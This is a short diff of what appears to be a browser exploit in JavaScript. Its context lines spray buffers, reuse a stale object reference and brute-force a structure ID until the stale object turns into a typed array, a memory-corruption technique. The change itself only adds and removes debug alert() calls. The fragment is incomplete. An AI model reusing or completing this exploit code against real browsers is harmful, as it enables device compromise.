@@ -165,7 +165,9 @@ for (var i = 0; i < 0x1000; i++){
 				
 				stale[1] = stale[0];
 				bufs[i][k] += 0x10;
-				alert("Raw:" + bufs[i][k].toString(16));
+				alert("Gonna access stale");
+				alert(stale[1]['a']);
+				alert("After accesing stale");
 				while(!(stale[0] instanceof Uint32Array)) {
 				    structID++;
 				    stale[1]['a'] = u2d(structID, 0);
@@ -269,7 +271,6 @@ for (var i = 0; i < 0x1000; i++){
  }
 
 function go() {
-    alert("getting ready!");
     dgc();
     dgc();
     dgc();
